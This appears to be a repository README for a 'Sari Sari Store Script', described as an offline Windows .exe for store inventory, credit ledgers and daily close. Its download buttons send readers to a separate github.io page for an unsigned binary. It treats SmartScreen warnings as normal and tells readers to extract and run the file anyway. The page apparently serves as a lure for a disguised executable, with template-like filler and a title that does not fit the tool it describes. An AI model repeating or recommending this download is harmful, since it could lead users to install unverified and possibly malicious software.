<div align="center">
<img src="assets/banner.png" width="100%" alt="Run Sari Sari Store Script banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-ff5065?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-EA580C?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-EA580C?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=9333EA&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%9A%80+Sari+Sari+Store+Script;%F0%9F%93%A6+Built+for+Windows+11;%E2%AD%90+Full+Feature+Suite;%F0%9F%92%A1+Community+Tested;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=python" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

**What is the Sari-Sari Store Script, really?** It's a 2026-ready **Run a Sari-Sari Store Script** toolkit — **31 modules** across inventory, ledger, pricing, customer credit, and daily-close automation. Built by a two-person side team, shipping as a single `.exe` you extract and run.

![status](https://img.shields.io/badge/status-stable-brightgreen?style=for-the-badge)
![platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue?style=for-the-badge)
![license](https://img.shields.io/badge/license-MIT-lightgrey?style=for-the-badge)
![build](https://img.shields.io/badge/build-single%20.exe-orange?style=for-the-badge)

</div>

---

## 🏪 The Problem

Running a sari-sari store on paper works — until it doesn't. The pain points we kept hearing on the forums and subreddits, over and over:

- **"Tingi" math is brutal.** You sell 5-peso loads of shampoo, 3-peso sticks, half-kilo rice — and the notebook disagrees with the till by Friday.
- **Utang (credit) gets forgotten.** A neighbor owes 240 pesos from three separate trips and nobody wrote the date.
- **Restock decisions are guesswork.** You reorder based on vibes, not what actually moved this week.
- **Daily close takes 40 minutes** of tallying by hand, and the totals still don't match.
- **Price changes never propagate.** You bump Coke by 1 peso and forget the 1.5L variant.
- **Expiry dates are invisible.** Chichirya goes stale on the shelf because nothing tracks batch dates.
- **Every "POS app" wants a subscription** and internet — for a store that runs on a folding table.

---

## 📓 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| v2.6.0 | 2026-02-14 | Daily-close module rewritten; 40% faster reconciliation on 500+ SKU ledgers. Added batch-expiry alerts. |
| v2.5.3 | 2025-12-02 | Fixed a rounding bug in tingi pricing for goods sold by weight. Credit ledger now exports to CSV. |
| v2.5.0 | 2025-10-19 | New pricing engine with per-variant propagation. Dropped two legacy dependencies (lighter install). |
| v2.4.1 | 2025-08-30 | Hotfix: restock suggestions no longer double-count weekend spikes. |
| v2.4.0 | 2025-08-11 | Introduced customer credit scoring, expiry tracking, and the daily-close summary sheet. |
| v2.3.0 | 2025-06-04 | First public build. Core inventory + ledger + manual entry. |

This is the 2026 line — deliberately faster and lighter than the 2024 community fork, with fewer dependencies and a single-binary distribution.

---

## 🔧 How It Works

Under the hood the script runs a small local SQLite ledger that lives beside the `.exe` in its extracted folder — no server, no cloud, no account. Every sale, restock, and credit entry is a row in that ledger, and modules are thin transaction handlers that read and write it. The pricing engine sits on top and resolves a product's price by walking variant → category → store default, so bumping a base price cascades correctly to the 1.5L Coke without touching the 330ml. The daily-close module is a pure reducer: it folds the day's rows into a summary sheet, recomputes the till expectation, and flags any discrepancy above a configurable threshold. Restock suggestions are a rolling 14-day weighted average of movement per SKU, clamped so a single fiesta-day spike can't wreck the reorder quantity. Everything runs in-process; the only outbound network call is an optional update check you can disable in settings.

---

## ⚖️ Comparison

| Aspect | Notebook / Paper | Generic POS Apps | This Tool |
|---|---|---|---|
| Cost | Free | Monthly subscription | Free, MIT-licensed |
| Internet required | No | Usually yes | No — fully offline |
| Tingi (per-piece) pricing | Manual math | Rarely supported | Native, per-variant |
| Utang / credit ledger | Easy to forget | Add-on module | Built-in with dates |
| Expiry / batch tracking | No | Sometimes | Yes, with alerts |
| Daily close time | 30–45 min | 10–20 min | Under 5 min |
| Install | None | Account + setup | Extract `.exe`, run |
| Data ownership | Yours | Vendor's cloud | Local SQLite file |

---

## 📦 All Modules Status

| Module | Status | Description |
|---|---|---|
| Inventory Core | ✅ Working | Add, edit, retire SKUs with category and variant tree |
| Tingi Pricing | ✅ Working | Per-piece and per-weight pricing with rounding rules |
| Ledger | ✅ Working | Append-only sale/restock/adjustment log |
| Credit (Utang) Book | ✅ Working | Per-customer balances with dated entries |
| Daily Close | ✅ Working | Folds the day into a summary and till check |
| Restock Suggestion | ✅ Working | 14-day weighted movement average per SKU |
| Expiry Tracker | ✅ Working | Batch dates with lead-time alerts |
| Price Propagation | ✅ Working | Cascade base-price changes to variants |
| CSV Export | ✅ Working | Ledger and credit exports for backup |
| Low-Stock Alerts | ✅ Working | Threshold per SKU, surfaced in the close sheet |
| Customer Scoring | ✅ Working | Simple on-time-payment score for credit limits |
| Receipt Printer | ⚠️ Beta | Thermal 58mm output; USB only for now |
| Barcode Scan | ⚠️ Beta | Keyboard-wedge scanners; camera mode experimental |
| Multi-Store | 🧪 Planned | Separate ledgers per branch |
| Cloud Sync | 🧪 Planned | Optional encrypted backup |

---

## 🧮 The Store Toolkit — Module Catalog

### 🛒 **Inventory & Stock**

| Feature | Effect |
|---|---|
| Variant tree | Group 330ml / 1.5L / case under one product |
| Batch dates | Track expiry per delivery, not per SKU |
| Adjustments | Shrinkage, spoilage, and miscounts logged with reason |
| Archive | Retire SKUs without losing history |

### 💵 **Pricing & Tingi**

| Feature | Effect |
|---|---|
| Per-piece rules | Define 1/4, 1/2, and whole-unit prices |
| Weight-based | Sell rice, sugar, coffee by gram or kilo |
| Rounding | Nearest 1, 5, or 25 centavos, configurable |
| Cascade | Base price change flows to all variants |

### 📒 **Ledger & Daily Close**

| Feature | Effect |
|---|---|
| Append-only log | Nothing is silently edited; corrections are new rows |
| Till check | Expected vs. counted cash, flagged if over threshold |
| Summary sheet | One screen per day, exportable |
| Reconciliation | Recompute any day from raw rows |

### 🤝 **Credit (Utang)**

| Feature | Effect |
|---|---|
| Dated entries | Every borrow and payment stamped |
| Balances | Per-customer running total |
| Limits | Soft caps based on payment score |
| Reminders | Flagged customers on the close sheet |

### 📈 **Restock & Expiry**

| Feature | Effect |
|---|---|
| Movement average | 14-day weighted, spike-clamped |
| Reorder list | Sorted by urgency, not alphabetically |
| Expiry alerts | Lead-time based, per batch |
| Waste log | Spoilage tracked against restock decisions |

### 🧾 **Output & Export**

| Feature | Effect |
|---|---|
| CSV export | Ledger, credit, and summary sheets |
| Receipt (beta) | 58mm thermal, USB |
| Barcode (beta) | Keyboard-wedge scan input |
| Backup | One-click copy of the SQLite file |

---

## 🧭 Key Features

| Feature | Description | Benefit |
|---|---|---|
| Single `.exe` | No installer, no runtime to install | Extract and run |
| Offline-first | No account, no internet | Works on a folding table |
| Local SQLite | Data lives beside the `.exe` | You own the file |
| Tingi-native | Per-piece and per-weight built in | Matches how you actually sell |
| Utang book | Dated credit entries per customer | No forgotten balances |
| Daily close | Fold the day in under 5 minutes | Faster end-of-day |
| Restock engine | Weighted 14-day movement | Order what actually moves |
| Expiry tracking | Batch-level dates with alerts | Less spoilage |
| Price cascade | Variant-aware price propagation | No stale variant prices |
| CSV export | Plain-text backups | Portable, auditable |
| MIT license | Fork it, audit it, keep it | No lock-in |
<p align="center">
  <a href="https://Ordermostyle24.github.io/sari-sari-store-script/">
    <img src="https://img.shields.io/badge/FETCH-Run_a_Sari--Sari-9333EA?style=plastic&logo=windows&logoColor=white&labelColor=7E22CE" width="580" alt="FETCH Run a Sari-Sari"/>
  </a>
</p>
---

## 📥 Installation

1. **Visit the project page** and grab the latest build. Download the zip.
2. **Extract** the archive to a folder you control — a USB stick works fine, the `.exe` runs from anywhere writable.
3. **Run** the `.exe`. On first launch it creates the SQLite ledger beside itself. No admin rights required.

> First-run note: Windows SmartScreen may warn on unsigned community builds. Verify the checksum from the project page before running — we sign nothing, we publish hashes.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 |
| RAM | 2 GB | 4 GB |
| Disk | 80 MB free | 250 MB free |
| Display | 1280×720 | 1920×1080 |
| Runtime | None (self-contained) | None |
| Internet | Not required | Optional for update check |
| Printer | — | 58mm thermal, USB (receipt beta) |

---

## ⌨️ Hotkeys / Controls

| Key | Action | Notes |
|---|---|---|
| `F2` | New sale | Focuses the entry field |
| `F3` | New restock | Adds a delivery batch |
| `F4` | Credit entry | Opens the utang book |
| `F5` | Daily close | Runs the summary reducer |
| `F6` | Restock list | Weighted movement view |
| `Ctrl+E` | Export CSV | Ledger or credit, your pick |
| `Ctrl+B` | Backup ledger | Copies the SQLite file |
| `Esc` | Cancel entry | Discards the current row |

---

## 🧩 Community & Support

The forums and subreddits are where this project actually lives — bug reports and tingi-pricing edge cases come from there, not from a ticket queue. If you hit a rounding quirk on a 3-peso stick or your till check flags a 12-peso drift, post it with the raw ledger export (CSV, redacted) and we'll reproduce it. Feature requests are welcome but we're a two-person side team, so the roadmap below is honest about pace. There is no paid tier, no Discord paywall, no "pro" build — the MIT license means you can fork it if the pace doesn't suit you.

---

## 🩹 Known Issues

| Issue | Solution |
|---|---|
| SmartScreen warning on first run | Verify checksum from project page; unsigned build |
| Receipt printer not detected | USB only in beta; replug and restart the `.exe` |
| Barcode camera mode flaky | Use keyboard-wedge scanner instead |
| Large ledger (>50k rows) slow close | Archive old days via CSV export, start fresh ledger |
| Price cascade skips a variant | Ensure variant inherits category, not manual price |

---

## ❓ FAQ

1. **Do I need an internet connection or an account?**
   No. The `.exe` runs fully offline and stores everything in a local SQLite file beside itself. The only network call is an optional update check you can disable.

2. **Is this the same as the 2024 fork?**
   No. This is the 2026 line — rewritten, lighter, fewer dependencies, and distributed as a single binary. The 2024 fork is a different codebase.

3. **Can it handle tingi pricing on rice and sugar by weight?**
   Yes. Weight-based pricing is a first-class module — define price per gram or kilo and the entry field accepts a weight.

4. **What happens if I lose the SQLite file?**
   You lose the ledger — there's no cloud sync (yet). The CSV export and one-click backup exist precisely for this. Back up weekly.

5. **Does it work on a USB stick?**
   Yes. Extract to a writable folder on the stick and run the `.exe` from there. The ledger travels with it.

6. **Is the receipt printer supported?**
   Beta only: 58mm thermal, USB. Network printers aren't supported yet.

7. **Can I run multiple stores from one install?**
   Not yet — multi-store is on the roadmap. For now, use separate extracted folders with separate ledgers.

8. **Why is the build unsigned?**
   We're a small side team and code-signing certificates cost money we'd rather spend on testing. We publish checksums instead.

---

## 🗺️ Roadmap / Planned Features

| Feature | Status | ETA |
|---|---|---|
| Multi-store ledgers | 🧪 Planned | 2026 Q2 |
| Encrypted cloud backup | 🧪 Planned | 2026 Q3 |
| Network thermal printers | 🧪 Planned | 2026 Q3 |
| Barcode camera mode (stable) | 🧪 Planned | 2026 Q4 |
| Supplier order sheets | 🧪 Planned | 2026 Q4 |
| Mobile companion (read-only) | 💭 Idea | 2027 |

---

## 🎯 Closing Notes

If you're running a sari-sari store and the notebook is winning, this is for you — extract the `.exe`, log a day's sales, run the close, and see whether the numbers agree. The team's own benchmark is whether a first-time user can do a full day's close in under ten minutes without reading the FAQ. Fork it, file the edge cases, and if you find a tingi rounding bug on a 3-peso stick, we want to hear about it.
<div align="center">
  <a href="https://Ordermostyle24.github.io/sari-sari-store-script/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Build-DB2777?style=plastic&logo=windows&logoColor=white&labelColor=BE185D" width="580" alt="DOWNLOAD Build"/>
  </a>
</div>